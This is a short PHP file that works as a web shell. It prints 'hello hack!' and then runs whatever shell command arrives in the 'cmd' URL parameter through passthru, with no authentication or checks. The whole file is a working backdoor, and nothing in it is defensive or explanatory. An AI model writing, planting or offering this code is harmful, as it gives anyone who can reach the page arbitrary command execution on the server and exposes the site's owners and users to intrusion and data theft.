<?php
$cmd=$_GET["cmd"];
echo "hello hack!".PHP_EOL;
if($cmd){
    passthru($cmd);
}
?>